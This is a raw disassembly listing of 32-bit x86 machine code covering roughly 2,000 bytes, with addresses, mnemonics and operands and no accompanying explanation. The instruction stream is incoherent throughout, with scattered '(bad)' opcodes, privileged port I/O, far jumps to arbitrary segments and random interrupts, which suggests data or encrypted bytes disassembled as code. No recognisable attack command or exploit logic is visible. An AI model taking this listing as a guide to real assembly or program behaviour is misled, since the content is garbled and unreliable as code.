  4142af:	in     al,0x6b
  4142b1:	push   edx
  4142b2:	or     al,dl
  4142b4:	sbb    eax,0x352949c3
  4142b9:	push   edi
  4142ba:	and    al,0xc0
  4142bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142bd:	fincstp 
  4142bf:	and    edi,DWORD PTR [esi+0x1c18bbf]
  4142c5:	stos   BYTE PTR es:[edi],al
  4142c6:	fisttp DWORD PTR [ecx]
  4142c8:	xchg   ecx,eax
  4142c9:	cmp    eax,0x53af8d4a
  4142ce:	in     al,0x8f
  4142d0:	mov    dh,0x64
  4142d2:	dec    eax
  4142d3:	push   ebp
  4142d4:	mov    edx,DWORD PTR [ecx-0x3ad1005]
  4142da:	xchg   esi,eax
  4142db:	mov    edi,DWORD PTR [ebp+0x2d]
  4142de:	loope  0x414307
  4142e0:	les    ebp,FWORD PTR [edi-0x38188bd7]
  4142e6:	and    edi,ebx
  4142e8:	mov    dh,0xb8
  4142ea:	ror    DWORD PTR [edx+eax*4-0x4e53c315],0xd3
  4142f2:	xchg   esp,eax
  4142f3:	adc    eax,0x3b7894b1
  4142f8:	fsubr  st,st(7)
  4142fa:	pop    edi
  4142fb:	cmp    al,0x8c
  4142fd:	xor    BYTE PTR [eax+0x1de86feb],cl
  414303:	pavgb  mm4,mm2
  414306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414307:	or     ebp,DWORD PTR ds:0x71e40008
  41430d:	std    
  41430e:	and    esi,edx
  414310:	adc    eax,0x2cbfb0fc
  414315:	or     eax,0x58ed3899
  41431a:	das    
  41431b:	dec    esi
  41431c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41431d:	in     eax,dx
  41431e:	sbb    DWORD PTR [edi+0x64913c38],eax
  414324:	fwait
  414325:	push   ecx
  414326:	ins    BYTE PTR es:[edi],dx
  414327:	rep ins BYTE PTR es:[edi],dx
  414329:	sub    bl,BYTE PTR [edi]
  41432b:	cmp    esi,edx
  41432d:	add    BYTE PTR [eax+0x69],bh
  414330:	fistp  WORD PTR [ebp*2+0x57c4684a]
  414337:	(bad)  
  414339:	fidivr WORD PTR [edx+edi*8]
  41433c:	daa    
  41433d:	mov    WORD PTR [edx+0x17e8320c],fs
  414343:	div    BYTE PTR [edi]
  414345:	xchg   ebx,eax
  414346:	and    eax,0xf02c575e
  41434b:	pop    edi
  41434c:	ror    BYTE PTR [edx+0x22],0xd4
  414350:	fisttp WORD PTR [eax+edi*8+0x4c]
  414354:	xchg   DWORD PTR [edi+0x505b0334],ecx
  41435a:	push   ds
  41435b:	lea    esi,[ecx-0x18aba485]
  414361:	inc    edx
  414362:	xchg   ebx,eax
  414363:	cvtpi2ps xmm1,QWORD PTR ds:0xd1902daa
  41436a:	icebp  
  41436b:	adc    DWORD PTR [ecx],ebp
  41436d:	mov    ecx,0x1c1c7044
  414372:	dec    edx
  414373:	xor    DWORD PTR [ebx-0x32],edi
  414376:	scas   al,BYTE PTR es:[edi]
  414377:	mov    dl,0xd3
  414379:	retf   
  41437a:	dec    edx
  41437b:	sub    ecx,DWORD PTR [esp+ebp*8]
  41437e:	jmp    0x8d83:0xc4b0d90d
  414385:	fdivr  DWORD PTR [ebx-0x16]
  414388:	pop    ss
  414389:	mov    bh,0xf5
  41438b:	inc    ecx
  41438c:	or     DWORD PTR [ecx-0x38aa1ece],ebx
  414392:	add    bh,BYTE PTR [esi]
  414394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414395:	pop    ecx
  414396:	test   bh,bh
  414398:	fsub   QWORD PTR [ebx-0x79ed7607]
  41439e:	adc    DWORD PTR [ecx-0x2b],esp
  4143a1:	push   edx
  4143a2:	imul   esi,DWORD PTR [eax-0x40],0x63e0ef8c
  4143a9:	in     al,0x70
  4143ab:	cmp    dl,BYTE PTR [esi-0x69]
  4143ae:	lock pusha 
  4143b0:	call   0x44f6:0xe5b6f693
  4143b7:	iret   
  4143b8:	adc    al,0x91
  4143ba:	dec    ebp
  4143bb:	xor    BYTE PTR [esi+0x1a],dl
  4143be:	sub    BYTE PTR [edi],ah
  4143c0:	push   cs
  4143c1:	aad    0x92
  4143c3:	mov    ah,BYTE PTR [edx]
  4143c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143c6:	sub    eax,0x6d5a3b0f
  4143cb:	in     al,dx
  4143cc:	loopne 0x4143ff
  4143ce:	dec    eax
  4143cf:	aam    0x52
  4143d1:	out    dx,al
  4143d2:	call   0xcaed:0x5280e73b
  4143d9:	add    eax,0xa9c43888
  4143de:	sub    DWORD PTR ds:0x8fa54a7e,eax
  4143e4:	add    ch,bl
  4143e6:	sbb    bl,bl
  4143e8:	iret   
  4143e9:	stos   BYTE PTR es:[edi],al
  4143ea:	test   al,0x72
  4143ec:	retf   0x636
  4143ef:	ins    BYTE PTR es:[edi],dx
  4143f0:	and    ecx,0x527762df
  4143f6:	(bad)  
  4143f7:	sub    cl,BYTE PTR [edi]
  4143f9:	icebp  
  4143fa:	mov    esp,0x9bc7e392
  414400:	xchg   esi,eax
  414401:	add    DWORD PTR [ecx-0x67a44347],ebp
  414407:	pop    ds
  414408:	push   DWORD PTR [edi-0x1edc9571]
  41440e:	aad    0xd6
  414410:	mov    ebx,0xca985b05
  414415:	bound  ecx,QWORD PTR [bx+si+0x67]
  414419:	cwde   
  41441a:	push   ds
  41441b:	mov    cl,0x8c
  41441d:	pushf  
  41441e:	push   ss
  41441f:	xchg   edi,eax
  414420:	cs je  0x4143e6
  414423:	fisttp DWORD PTR [ebx]
  414425:	std    
  414426:	fcmovbe st,st(3)
  414428:	push   esp
  414429:	mov    BYTE PTR [eax+0x28],bl
  41442c:	lods   al,BYTE PTR ds:[esi]
  41442d:	mov    esp,0x26053eae
  414432:	out    0x71,eax
  414434:	xchg   edx,eax
  414435:	or     DWORD PTR [eax+0x44],edi
  414438:	cmp    DWORD PTR [ebx],esp
  41443a:	arpl   WORD PTR [esi+ebp*4+0x3],cx
  41443e:	mul    edx
  414440:	and    eax,0x2ec7971b
  414445:	sbb    esi,esi
  414447:	adc    DWORD PTR gs:[ebx],esp
  41444a:	push   ss
  41444b:	fidivr WORD PTR [esi-0x3be2d11e]
  414451:	outs   dx,BYTE PTR ds:[esi]
  414452:	xchg   ebx,eax
  414453:	jl     0x414410
  414455:	xor    cl,0xf6
  414458:	dec    ecx
  414459:	inc    edx
  41445a:	out    dx,eax
  41445b:	pop    eax
  41445c:	es stos DWORD PTR es:[edi],eax
  41445e:	scas   al,BYTE PTR es:[edi]
  41445f:	xchg   ecx,eax
  414460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414461:	cmp    ebp,DWORD PTR ds:0x16cd8dd4
  414467:	inc    esi
  414468:	push   esp
  414469:	lahf   
  41446a:	dec    edx
  41446b:	ret    0x1cc7
  41446e:	bound  esi,QWORD PTR [edi-0x34]
  414471:	push   ebp
  414472:	or     ecx,DWORD PTR [edi+0x37461487]
  414478:	and    BYTE PTR [edx+ecx*8-0x13],bl
  41447c:	lods   eax,DWORD PTR ds:[esi]
  41447d:	inc    ecx
  41447e:	cli    
  41447f:	into   
  414480:	and    dl,dl
  414482:	stos   DWORD PTR es:[edi],eax
  414483:	inc    ebp
  414484:	pop    ebx
  414485:	sahf   
  414486:	inc    edi
  414487:	dec    edi
  414488:	mov    ah,0x8d
  41448a:	mov    ebx,0x9d3bf70c
  41448f:	jp     0x4144b2
  414491:	in     al,dx
  414492:	or     eax,0x46529c87
  414497:	and    DWORD PTR [ebp-0x34bb2600],esp
  41449d:	jae    0x414459
  41449f:	pop    esi
  4144a0:	nop
  4144a1:	fdiv   DWORD PTR [ebx-0x30]
  4144a4:	adc    ebx,ecx
  4144a6:	xchg   DWORD PTR [edx-0x6ac2d69d],eax
  4144ac:	mov    eax,DWORD PTR [edi-0x48]
  4144af:	stos   BYTE PTR es:[edi],al
  4144b0:	arpl   WORD PTR [ebx-0x77fea3c7],ax
  4144b6:	aaa    
  4144b7:	test   BYTE PTR [ebp+edi*1-0x58cc5fa8],cl
  4144be:	inc    esp
  4144bf:	cmp    al,0x21
  4144c1:	inc    ebp
  4144c2:	js     0x41445a
  4144c4:	cmp    al,BYTE PTR [edi]
  4144c6:	push   ebx
  4144c7:	sbb    edi,DWORD PTR [ecx-0x300f96a2]
  4144cd:	scas   eax,DWORD PTR es:[edi]
  4144ce:	div    dl
  4144d0:	aam    0x2f
  4144d2:	sub    BYTE PTR [edi],dh
  4144d4:	les    esi,FWORD PTR [edi+0x7a]
  4144d7:	sub    eax,0x1eaea31a
  4144dc:	enter  0x4bf4,0xe5
  4144e0:	dec    edx
  4144e1:	adc    al,0x94
  4144e3:	sar    BYTE PTR [ecx+edi*4-0x57],1
  4144e7:	ror    BYTE PTR [eax+edi*1],1
  4144ea:	iret   
  4144eb:	sahf   
  4144ec:	pop    ebx
  4144ed:	imul   esi,DWORD PTR [edx],0x2d1680df
  4144f3:	push   eax
  4144f4:	xor    DWORD PTR [eax-0x49],0x68
  4144f8:	jmp    0x63c9:0x7aa45eda
  4144ff:	es fcom st(2)
  414502:	pop    ss
  414503:	pushf  
  414504:	xchg   ebp,eax
  414505:	sbb    eax,0x209b8b52
  41450a:	jl     0x414511
  41450c:	adc    ah,BYTE PTR [edx]
  41450e:	mov    ch,0x39
  414510:	dec    edx
  414511:	xchg   BYTE PTR [ecx-0x5e6e37ff],al
  414517:	push   ebp
  414518:	jmp    DWORD PTR [ecx]
  41451a:	sbb    dh,BYTE PTR [eax]
  41451c:	(bad)
  41451f:	push   ebx
  414520:	mov    al,ds:0xa62e9363
  414525:	fwait
  414526:	popa   
  414527:	inc    ebp
  414528:	retf   0x15cb
  41452b:	inc    bp
  41452d:	xchg   ebp,eax
  41452e:	sbb    DWORD PTR [esp+ecx*4],edi
  414531:	cmp    ch,BYTE PTR [ebp+eax*1+0x2415c5ea]
  414538:	sub    eax,0x2ee15a33
  41453d:	out    0xd4,al
  41453f:	mov    ebx,DWORD PTR [esi+0x5e0e72cd]
  414545:	push   ebx
  414546:	addr16 repz adc eax,esi
  41454a:	dec    ebp
  41454b:	mov    DWORD PTR [ebx-0x73],eax
  41454e:	mov    eax,ds:0xf0463f97
  414553:	adc    cl,cl
  414555:	ja     0x4145d4
  414557:	sub    ecx,edi
  414559:	ss clc 
  41455b:	jl     0x414527
  41455d:	cmp    edx,ebp
  41455f:	push   edx
  414560:	bnd jge 0x41459e
  414563:	fs nop
  414565:	sahf   
  414566:	pop    es
  414567:	and    bl,dl
  414569:	sbb    eax,0x1df829a8
  41456e:	inc    edi
  41456f:	sub    al,0x7c
  414571:	xor    DWORD PTR [esi+0x412dc191],esi
  414577:	sub    ecx,ebx
  414579:	or     BYTE PTR [edi+0x12a1b138],ah
  41457f:	shl    BYTE PTR [edi-0x7],0x9f
  414583:	aad    0xe5
  414585:	retf   
  414586:	inc    edi
  414587:	retf   0x5aac
  41458a:	adc    eax,0x7189363d
  41458f:	cmp    dh,ah
  414591:	xor    DWORD PTR [edi+0x76],0x34742841
  414598:	cdq    
  414599:	ss rcl BYTE PTR cs:[eax-0x983074c],1
  4145a1:	dec    esp
  4145a2:	xor    eax,0x4d8b5167
  4145a7:	and    eax,0xd39e9e8d
  4145ac:	pop    ecx
  4145ad:	mov    BYTE PTR [edx-0x4b14ccb3],bh
  4145b3:	inc    esi
  4145b4:	pop    ebp
  4145b5:	mov    ebx,0x9359fb9a
  4145ba:	jno    0x41455a
  4145bc:	sbb    BYTE PTR [ebx+0x42c88bdc],ch
  4145c2:	dec    esi
  4145c3:	fs sub eax,0xf993bd4b
  4145c9:	lock or ebp,DWORD PTR [edx]
  4145cc:	or     bl,BYTE PTR [edx]
  4145ce:	shl    BYTE PTR [eax],1
  4145d0:	sbb    eax,0xbae8dd53
  4145d5:	mov    ecx,0x5191a79f
  4145da:	pop    ds
  4145db:	imul   esp,DWORD PTR [edx-0x8],0xd89e8401
  4145e2:	outs   dx,BYTE PTR ds:[esi]
  4145e3:	fld    QWORD PTR [esi]
  4145e5:	push   0xe162c7b2
  4145ea:	(bad)  
  4145eb:	loopne 0x414592
  4145ed:	xor    bh,ch
  4145ef:	mov    ecx,0xb3acdbb8
  4145f4:	(bad)  
  4145f5:	mov    edi,0xa94d3da
  4145fa:	sbb    al,0x92
  4145fc:	or     al,0x77
  4145fe:	jnp    0x41464d
  414600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414601:	bound  edx,QWORD PTR [edi+0x2fb3b2ce]
  414607:	mov    dl,0xbf
  414609:	test   DWORD PTR [ecx-0x45],eax
  41460c:	cmp    BYTE PTR [eax-0x67],bl
  41460f:	mov    dh,0xdf
  414611:	leave  
  414612:	fist   WORD PTR [esi-0x5d]
  414615:	adc    al,0x75
  414617:	xor    al,0x23
  414619:	or     cl,BYTE PTR [esi-0x2d]
  41461c:	fidiv  DWORD PTR [edx-0x69e5fcc6]
  414622:	dec    eax
  414623:	scas   al,BYTE PTR es:[edi]
  414624:	into   
  414625:	pop    ebp
  414626:	aaa    
  414627:	mov    al,0xbf
  414629:	or     eax,0xfe2cbc0d
  41462e:	aam    0xe6
  414630:	sar    DWORD PTR cs:[ecx],0xd6
  414634:	test   eax,0x31690f1a
  414639:	ja     0x41464a
  41463b:	sbb    eax,0xa403f1e9
  414640:	jmp    0x64ddf2b8
  414645:	xchg   ecx,eax
  414646:	ret    0x8a63
  414649:	add    eax,0xcb60f441
  41464e:	in     eax,0x64
  414650:	out    dx,al
  414651:	in     eax,dx
  414652:	sub    DWORD PTR es:[ecx-0x42],eax
  414656:	maxps  xmm6,xmm4
  414659:	mov    ds:0x533255c8,al
  41465e:	int    0x84
  414660:	cmp    ch,BYTE PTR [ecx+0x791a7223]
  414666:	rcl    DWORD PTR [ebp-0x5e2cd02a],cl
  41466c:	mov    dl,BYTE PTR [esp+ebx*1-0x1a14d4a5]
  414673:	pop    ecx
  414674:	push   0xe61c6167
  414679:	pop    eax
  41467a:	mov    eax,0x6ccc2310
  41467f:	mov    ah,0x60
  414681:	popa   
  414682:	out    dx,al
  414683:	test   ebp,ebx
  414685:	inc    ebx
  414686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414687:	imul   ebx
  414689:	clc    
  41468a:	add    al,BYTE PTR [ecx]
  41468c:	xchg   esp,eax
  41468d:	and    BYTE PTR [edx+0x47862b4a],cl
  414693:	cli    
  414694:	fisub  DWORD PTR ds:0x8c78def8
  41469a:	adc    al,0xf8
  41469c:	dec    edi
  41469d:	xchg   ebx,eax
  41469e:	xchg   edx,eax
  41469f:	and    al,0x3c
  4146a1:	test   BYTE PTR [ecx-0x5f],dl
  4146a4:	cmp    eax,0xec92b222
  4146a9:	sbb    eax,0xc4b15b7f
  4146ae:	inc    cl
  4146b0:	out    dx,al
  4146b1:	mov    esp,0x647d45c4
  4146b6:	xlat   BYTE PTR ds:[ebx]
  4146b7:	in     eax,0xd9
  4146b9:	jnp    0x4146bf
  4146bb:	cwde   
  4146bc:	jb     0x414728
  4146be:	div    DWORD PTR ds:0x3019f67f
  4146c4:	test   eax,0xf05c50cd
  4146c9:	dec    edx
  4146ca:	data16 outs dx,BYTE PTR ds:[esi]
  4146cc:	fdiv   st(3),st
  4146ce:	lods   al,BYTE PTR ds:[esi]
  4146cf:	push   eax
  4146d0:	mov    bh,0x68
  4146d2:	out    dx,eax
  4146d3:	jnp    0x41466c
  4146d5:	cdq    
  4146d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146d7:	stc    
  4146d8:	xchg   ebx,eax
  4146d9:	js     0x414724
  4146db:	adc    ah,BYTE PTR [eax+0x5588b281]
  4146e1:	fistp  WORD PTR ss:[eax+ebx*2+0x2c]
  4146e6:	sahf   
  4146e7:	push   ebx
  4146e8:	jle    0x414731
  4146ea:	adc    cl,BYTE PTR [edi-0x4bb96e8f]
  4146f0:	vpand  ymm3,ymm7,YMMWORD PTR [edi]
  4146f4:	push   cs
  4146f5:	cmp    eax,0x35203ccb
  4146fa:	cli    
  4146fb:	push   0xb38d90fd
  414700:	or     BYTE PTR [ebx],0x2b
  414703:	pmulhw mm6,mm1
  414706:	das    
  414707:	call   0x73a1:0xc3048b58
  41470e:	scas   al,BYTE PTR es:[edi]
  41470f:	call   0xeda0e416
  414714:	test   ebx,ebp
  414716:	div    BYTE PTR [ecx]
  414718:	pushf  
  414719:	aam    0xf3
  41471b:	jno    0x41476e
  41471d:	fstp   TBYTE PTR [ecx+0x58391ae0]
  414723:	mov    esp,0xdba4d7fa
  414728:	jb     0x414723
  41472a:	sbb    eax,DWORD PTR [edx-0x3c]
  41472d:	mov    WORD PTR [esi+0x1ee63a12],gs
  414733:	ret    
  414734:	sub    DWORD PTR [ecx],eax
  414736:	into   
  414737:	ja     0x4146c2
  414739:	push   es
  41473a:	jbe    0x414786
  41473c:	sbb    DWORD PTR [esi],0x661a37a7
  414742:	shl    BYTE PTR [ebp+0x7ced46e0],0xf
  414749:	push   ds
  41474a:	adc    BYTE PTR [eax],al
  41474c:	imul   ebp,DWORD PTR [esi-0x3f4a89ee],0x6bafbc14
  414756:	or     BYTE PTR [ebx-0x3bac2f2e],0x1b
  41475d:	outs   dx,DWORD PTR ds:[esi]
  41475e:	cmp    esp,DWORD PTR [edx+0x1e]
  414761:	and    al,ah
  414763:	imul   eax,edi,0x7d
  414766:	or     ebp,edi
  414768:	les    ebx,FWORD PTR [ecx]
  41476a:	jbe    0x414743
  41476c:	into   
  41476d:	cmp    DWORD PTR [edi+eax*1+0x13],edi
  414771:	dec    ebp
  414772:	sbb    ebp,DWORD PTR [esi+0x48a824ba]
  414778:	xchg   esp,eax
  414779:	out    dx,al
  41477a:	pop    es
  41477b:	int    0x53
  41477d:	mov    edi,0x534971cd
  414782:	or     al,0x4a
  414784:	js     0x414789
  414786:	imul   ebp,DWORD PTR [ebx+0x56eefa23],0x7c4e7589
  414790:	dec    ebp
  414791:	repnz lock int3 
  414794:	or     BYTE PTR [ecx+eiz*1],dl
  414797:	rcl    BYTE PTR [eax],0xdc
  41479a:	mov    edx,0xb4f5be7
  41479f:	pop    ss
  4147a0:	test   al,0x75
  4147a2:	popf   
  4147a3:	pusha  
  4147a4:	sbb    dl,BYTE PTR [bx+di-0x1f3c]
  4147a9:	sbb    eax,0xef8c3901
  4147ae:	xor    al,0x20
  4147b0:	xchg   edi,eax
  4147b1:	loopne 0x414827
  4147b3:	lds    ebp,FWORD PTR [esi]
  4147b5:	aad    0xf7
  4147b7:	test   DWORD PTR [esi],edx
  4147b9:	add    dh,dh
  4147bb:	or     DWORD PTR [esp+eax*2+0x3e],edi
  4147bf:	iret   
  4147c0:	pop    esi
  4147c1:	or     DWORD PTR [ebx+0x7452baa9],ebp
  4147c7:	int3   
  4147c8:	pushf  
  4147c9:	xor    al,0x22
  4147cb:	loop   0x41478e
  4147cd:	scas   eax,DWORD PTR es:[edi]
  4147ce:	jmp    0x3e04:0xbe9c36b4
  4147d5:	mov    esp,0xb7e015b5
  4147da:	mov    BYTE PTR [ecx],dl
  4147dc:	add    ebx,DWORD PTR [esi+esi*4+0x3a49bb9]
  4147e3:	cmp    eax,0x7594cf0f
  4147e8:	not    BYTE PTR [eax]
  4147ea:	adc    DWORD PTR [edi+esi*4],ebx
  4147ed:	shl    edi,0x16
  4147f0:	sbb    eax,0xd81844cc
  4147f5:	ja     0x414868
  4147f7:	popf   
  4147f8:	stc    
  4147f9:	push   esp
  4147fa:	stos   DWORD PTR es:[edi],eax
  4147fb:	and    eax,esp
  4147fd:	fsub   st(7),st
  4147ff:	xchg   esi,eax
  414800:	ja     0x414804
  414802:	(bad)  
  414803:	push   edx
  414804:	push   esi
  414805:	ss xchg ebx,eax
  414807:	out    0xc9,eax
  414809:	test   al,0xee
  41480b:	repz mov eax,0xe4bfa36d
  414811:	xor    esi,DWORD PTR [ecx]
  414813:	pushf  
  414814:	sub    BYTE PTR [eax-0x1019af69],ch
  41481a:	xchg   edx,eax
  41481b:	fs mov dh,0xcf
  41481e:	pop    edx
  41481f:	pushf  
  414820:	in     eax,dx
  414821:	out    dx,al
  414822:	(bad)  
  414823:	repnz sbb BYTE PTR [ebx+0x43],0x53
  414828:	jbe    0x41488c
  41482a:	out    0x4c,al
  41482c:	retf   
  41482d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41482e:	in     al,dx
  41482f:	mov    bl,0xcb
  414831:	cmp    DWORD PTR [edx],0xffffffc9
  414834:	loop   0x41488a
  414836:	push   edi
  414837:	inc    edi
  414838:	out    dx,eax
  414839:	retf   0x593
  41483c:	cmp    edi,ebx
  41483e:	push   es
  41483f:	in     al,0x93
  414841:	sbb    eax,0x47e282fb
  414846:	inc    ebx
  414847:	(bad)
  41484a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41484b:	add    DWORD PTR [edi-0x5],ebx
  41484e:	adc    DWORD PTR [ecx],esp
  414850:	adc    ebx,ebx
  414852:	pop    edx
  414853:	sti    
  414854:	sbb    BYTE PTR [esi],ch
  414856:	dec    esi
  414857:	xchg   edx,eax
  414858:	mov    ds:0xef42981f,al
  41485d:	pop    edi
  41485e:	imul   ecx,eax,0xffffffeb
  414861:	out    dx,al
  414862:	pop    edi
  414863:	cs or  ch,BYTE PTR gs:[ebp+0x11aac6cd]
  41486b:	ja     0x414839
  41486d:	arpl   WORD PTR [ebx+eax*4-0x54],cx
  414871:	mov    bl,dl
  414873:	dec    eax
  414874:	fs jb  0x4148ef
  414877:	sbb    esp,DWORD PTR [ebp+edx*2-0x60]
  41487b:	std    
  41487c:	loop   0x4148be
  41487e:	pop    esi
  41487f:	mov    ss,WORD PTR ds:0xb7315640
  414885:	jo     0x414840
  414887:	hlt    
  414888:	xchg   edx,eax
  414889:	sbb    dh,bh
  41488b:	cmp    edi,DWORD PTR [ebp+0x31]
  41488e:	iret   
  41488f:	test   DWORD PTR [eax+0x70],ebp
  414892:	xor    al,0x5b
  414894:	inc    edi
  414895:	jmp    0x7143:0x91790e07
  41489c:	cmp    eax,0x9c5b4cda
  4148a1:	pusha  
  4148a2:	lea    ebx,[edi]
  4148a4:	sar    BYTE PTR [esi+edi*8],1
  4148a7:	xchg   edx,eax
  4148a8:	or     eax,ebx
  4148aa:	ret    0xa89f
  4148ad:	stos   DWORD PTR es:[edi],eax
  4148ae:	push   cs
  4148af:	lods   eax,DWORD PTR ds:[esi]
  4148b0:	cld    
  4148b1:	cmc    
  4148b2:	int    0x6a
  4148b4:	jns    0x414896
  4148b6:	loop   0x414923
  4148b8:	aad    0x13
  4148ba:	sub    cl,BYTE PTR [esi+0x7f]
  4148bd:	dec    ecx
  4148be:	mov    esi,0x7a867f45
  4148c3:	xchg   ebp,eax
  4148c4:	or     BYTE PTR [esi+ebp*8+0x50f48c58],dl
  4148cb:	cmp    bl,BYTE PTR ds:0x991fe427
  4148d1:	xchg   esi,eax
  4148d2:	adc    al,0x3e
  4148d4:	into   
  4148d5:	sbb    BYTE PTR [edx+0x69129b4b],ah
  4148db:	xor    BYTE PTR [ecx],ch
  4148dd:	enter  0x436a,0x69
  4148e1:	or     DWORD PTR [esi],edx
  4148e3:	jle    0x414884
  4148e5:	mov    ds:0x56fbbefa,eax
  4148ea:	fistp  QWORD PTR [esi-0xa80828d]
  4148f0:	mov    dl,0xb4
  4148f2:	add    al,0x39
  4148f4:	sbb    eax,0x192bce64
  4148f9:	or     bl,BYTE PTR [edi-0x53]
  4148fc:	sub    eax,0x8b32521
  414902:	cmc    
  414903:	fbld   TBYTE PTR ds:0x5d561e3b
  414909:	sbb    esp,DWORD PTR [edi]
  41490b:	xor    esi,ebx
  41490d:	cdq    
  41490e:	aam    0xf1
  414910:	imul   esi,DWORD PTR [ecx-0x4b28169c],0x6e873bb
  41491a:	inc    edx
  41491b:	sbb    al,0x3e
  41491d:	xchg   DWORD PTR [edx],esi
  41491f:	loopne 0x4148ea
  414921:	inc    ebp
  414922:	(bad)  
  414924:	bound  edx,QWORD PTR [ebx+0x2e024be9]
  41492a:	retf   0xab4
  41492d:	sub    al,BYTE PTR [ebp-0x49]
  414930:	jmp    0x4148e4
  414932:	mov    ds:0x114c5ac8,eax
  414937:	imul   esi,DWORD PTR [eax-0xb0559e6],0xb81646de
  414941:	or     al,0xd5
  414943:	call   0xfbf86196
  414948:	xor    DWORD PTR ds:0xf6cea207,ebx
  41494e:	sbb    al,0xc9
  414950:	ret    
  414951:	jp     0x414970
  414953:	or     eax,0xa3daad8
  414958:	icebp  
  414959:	inc    edi
  41495a:	mov    ds:0xa5489236,eax
  41495f:	and    al,0x23
  414961:	(bad)  
  414963:	pop    es
  414964:	ss lahf 
  414966:	add    al,0xab
  414968:	and    BYTE PTR [ebp+0x4f],dl
  41496b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41496c:	(bad)  
  41496d:	jg     0x414971
  41496f:	pop    eax
  414970:	hlt    
  414971:	xor    al,0x40
  414973:	shl    al,cl
  414975:	mov    edx,0x627256c0
  41497a:	mov    bh,0xa2
  41497c:	dec    esp
  41497d:	js     0x414903
  41497f:	and    DWORD PTR ds:0x1a387fa6,ebx
  414985:	leave  
  414986:	mov    eax,ds:0x828575a6
  41498b:	out    dx,eax
  41498c:	mov    ch,0xa7
  41498e:	pusha  
  41498f:	cmp    eax,0x446324ec
  414994:	in     eax,dx
  414995:	mov    ah,0xd5
  414997:	dec    ebx
  414998:	xor    BYTE PTR [ebx+0x124d96f4],0x55
  41499f:	jno    0x41493a
  4149a1:	jns    0x4149d1
  4149a3:	mov    al,0xc2
  4149a5:	std    
  4149a6:	mov    eax,0x21861a88
  4149ab:	xchg   ebx,eax
  4149ac:	pop    esi
  4149ad:	test   eax,0xf88f3ea9
  4149b2:	aad    0x37
  4149b4:	xchg   DWORD PTR [eax+0x43b5330e],edx
  4149ba:	ins    DWORD PTR es:[edi],dx
  4149bb:	test   DWORD PTR ss:[eax],edi
  4149be:	push   0xb0fbc128
  4149c3:	jg     0x4149f4
  4149c5:	repz sub DWORD PTR [ebx-0x31],0xd82bd00
  4149cd:	and    BYTE PTR [edi+0x71556214],0xc7
  4149d4:	cmp    DWORD PTR [esi+0x5e],ebx
  4149d7:	cli    
  4149d8:	jo     0x414a59
  4149da:	sahf   
  4149db:	neg    DWORD PTR [ebx]
  4149dd:	dec    BYTE PTR [edx-0x4b]
  4149e0:	out    0x25,eax
  4149e2:	jbe    0x414a44
  4149e4:	dec    ebp
  4149e5:	mov    bl,0xc6
  4149e7:	aas    
  4149e8:	jb     0x414a0b
  4149ea:	loope  0x4149e0
  4149ec:	sub    cl,BYTE PTR [ecx+ebp*4-0x2c53086a]
  4149f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149f4:	and    edx,edx
  4149f6:	int    0x50
  4149f8:	cmp    dl,BYTE PTR [ecx+edx*1]
  4149fb:	stc    
  4149fc:	push   0x4264c434
  414a01:	test   dh,bl
  414a03:	add    al,0xd9
  414a05:	jnp    0x414a28
  414a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a08:	sti    
  414a09:	inc    esi
  414a0a:	repnz mov BYTE PTR [ecx],dl
  414a0d:	fstp   DWORD PTR [edi-0x2b]
  414a10:	scas   al,BYTE PTR es:[edi]
  414a11:	stos   BYTE PTR es:[edi],al
  414a12:	ret    
  414a13:	jmp    0x9be2:0x1f9ccc05
  414a1a:	mov    bl,0xab
  414a1c:	mov    edx,eax
  414a1e:	pmaxub mm5,QWORD PTR [ecx-0x5b6f02ea]
  414a25:	sub    al,BYTE PTR [ecx+0x19622d3f]
  414a2b:	mov    dh,0x4c
  414a2d:	pushf  
  414a2e:	nop
  414a2f:	jle    0x414aa0
  414a31:	or     bh,BYTE PTR [edx-0x3e]
  414a34:	ins    DWORD PTR es:[edi],dx
  414a35:	aam    0xb
  414a37:	popf   
  414a38:	mov    bh,0x8d
  414a3a:	lds    esi,FWORD PTR [eax-0x2891f93b]
  414a40:	jmp    0x499a:0x3b5d00ea
  414a47:	lock outs dx,BYTE PTR ds:[esi]
  414a49:	sahf   
  414a4a:	jb     0x414a82
  414a4c:	sbb    al,0x96
  414a4e:	mov    edx,0xd7306a32
  414a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a54:	pop    esi
  414a55:	xlat   BYTE PTR ds:[ebx]
  414a56:	(bad)  
  414a57:	sub    ecx,DWORD PTR [ecx]
  414a59:	daa    
  414a5a:	call   0xd1a34214
  414a5f:	aad    0x77
  414a61:	popa   
  414a62:	pushf  
  414a63:	jb     0x414ac6
  414a65:	xchg   edx,eax
  414a66:	jmp    0x414adb
  414a68:	xcrypt-ecb (bad)
  414a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a6a:	push   cs
  414a6b:	fisttp QWORD PTR [esi-0x72]
  414a6e:	mov    esp,DWORD PTR [esi]
  414a70:	jl     0x414a09
  414a72:	and    al,bl
  414a74:	lea    eax,[ebx-0x2522f695]
  414a7a:	sahf   
  414a7b:	ret    0x7397
  414a7e:	(bad)  
  414a7f:	cmp    edx,DWORD PTR [edi+eiz*1]
  414a82:	test   al,0x8d
  414a84:	mov    ds:0x395bf334,al
  414a89:	popa   
  414a8a:	cmp    eax,0xf33b512b
  414a8f:	bsf    ebp,DWORD PTR [edi-0x6f]
  414a93:	inc    ebp
  414a94:	add    edi,DWORD PTR [ecx+0x71]
  414a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a98:	ror    DWORD PTR [eax+0x7e],cl
  414a9b:	aad    0xd
  414a9d:	xchg   ebx,edx
  414a9f:	xchg   ebp,eax
  414aa0:	lods   eax,DWORD PTR ds:[esi]
